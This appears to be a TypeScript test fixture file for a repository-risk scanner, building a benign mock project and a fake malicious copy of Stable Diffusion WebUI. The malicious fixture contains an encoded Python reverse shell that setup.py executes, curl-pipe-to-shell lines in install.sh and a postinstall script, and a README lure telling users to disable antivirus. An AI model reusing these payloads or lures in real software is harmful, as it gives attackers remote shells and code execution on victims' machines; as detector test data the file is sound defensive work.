import type { RepoFile, RepoInfo, RepoSnapshot, TreeEntry } from "./github.ts";

export const now = Date.parse("2026-11-05T12:00:00Z");

export function daysAgo(n: number): string {
    return new Date(now - n * 86_400_000).toISOString().replace(/\.\d+Z$/, "Z");
}

export function info(over: Partial<RepoInfo> = {}): RepoInfo {
    return {
        owner: "acme",
        repo: "tool",
        description: "",
        stars: 200,
        forks: 20,
        createdAt: daysAgo(800),
        pushedAt: daysAgo(3),
        sizeKiB: 2048,
        archived: false,
        fork: false,
        license: "MIT",
        language: "Python",
        defaultBranch: "main",
        topics: [],
        ...over,
    };
}

export function blobs(...paths: string[]): TreeEntry[] {
    return paths.map((path) => ({ path, type: "blob", size: 100 }));
}

export function file(path: string, text: string): RepoFile {
    return { path, text, truncated: false };
}

export const longBase64 = Buffer.from(
    "import socket,subprocess,os;s=socket.socket();s.connect(('45.9.12.3',4444));".repeat(6),
).toString("base64");

/* A popular, old, licensed project with ordinary install steps */

const mainstreamReadme = `# Flasky

A small web framework.

## Install

    pip install flasky

Or use the installer, which only downloads the wheel:

    curl -fsSL https://flasky.dev/install.sh | sh

Then open http://127.0.0.1:5000 in your browser.

![logo](data:image/png;base64,${"iVBORw0KGgo".repeat(40)})

Set your password: in the admin panel after the first start.
`;

const mainstreamSetup = `import os
from setuptools import setup, find_packages
from setuptools.command.build_py import build_py

def read_version():
    exec(compile(open("src/flasky/version.py").read(), "version.py", "exec"))
    return locals()["__version__"]

class BuildPy(build_py):
    pass

setup(
    name="flasky",
    version=read_version(),
    packages=find_packages("src"),
    install_requires=["click>=8", "itsdangerous>=2", "jinja2>=3"],
    cmdclass={"build_py": BuildPy},
)
`;

const mainstreamWorkflow = `name: release
on:
  push:
    tags: ["v*"]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Create release
        run: |
          curl -X POST -H "Authorization: token \${{ secrets.GITHUB_TOKEN }}" \\
            https://api.github.com/repos/pallets/flasky/releases
      - uses: pypa/gh-action-pypi-publish@release/v1
        with:
          password: \${{ secrets.PYPI_TOKEN }}
`;

const mainstreamPackage = JSON.stringify({
    name: "flasky-docs",
    private: true,
    scripts: { prepare: "husky", build: "vite build" },
    devDependencies: { vite: "^7.0.0" },
});

export function mainstream(): RepoSnapshot {
    return {
        info: info({
            owner: "pallets",
            repo: "flasky",
            description: "The Python micro framework for building web applications",
            stars: 68_000,
            forks: 16_000,
            createdAt: "2010-04-06T11:11:59Z",
            license: "BSD-3-Clause",
        }),
        ownerCreatedAt: "2010-04-06T10:00:00Z",
        ownerType: "Organization",
        tree: blobs(
            "README.md",
            "setup.py",
            "package.json",
            "requirements.txt",
            "src/flasky/__init__.py",
            "tests/fixtures/sample.zip",
            "scripts/make.bat",
            ".github/workflows/release.yml",
        ),
        treeTruncated: false,
        picked: 0,
        files: [
            file("package.json", mainstreamPackage),
            file("setup.py", mainstreamSetup),
            file("README.md", mainstreamReadme),
            file("requirements.txt", "click>=8\nitsdangerous>=2\n"),
            file(".github/workflows/release.yml", mainstreamWorkflow),
        ],
        notes: [],
        complete: true,
    };
}

/* A week-old copy of a popular repo with every lure in the book */

const maliciousReadme = `# Stable Diffusion WebUI (fast installer)

Download Setup.zip from releases. Archive password: 2025

Disable Windows Defender before running, it flags the loader by mistake.

Join https://discord.gg/abc for support.
`;

const maliciousSetup = `from setuptools import setup
import base64
exec(base64.b64decode("${longBase64}"))
setup(name="sd-webui")
`;

const maliciousInstall = `#!/bin/sh
curl -s http://45.9.12.3/p | sh
wget https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789 -O /dev/null
`;

const maliciousPackage = JSON.stringify({
    name: "sd-webui",
    scripts: { postinstall: "curl -s http://45.9.12.3/x | sh" },
});

export function malicious(): RepoSnapshot {
    return {
        info: info({
            owner: "sd-webui-official",
            repo: "stable-diffusion-webui",
            description: "Fast Stable Diffusion WebUI installer",
            stars: 3,
            forks: 0,
            createdAt: daysAgo(5),
            license: null,
        }),
        ownerCreatedAt: daysAgo(12),
        ownerType: "User",
        tree: blobs(
            "README.md",
            "setup.py",
            "install.sh",
            "package.json",
            "Setup.exe",
            "bin/loader.dll",
            "Setup.zip",
        ),
        treeTruncated: false,
        picked: 0,
        files: [
            file("package.json", maliciousPackage),
            file("setup.py", maliciousSetup),
            file("install.sh", maliciousInstall),
            file("README.md", maliciousReadme),
        ],
        notes: [],
        complete: true,
    };
}
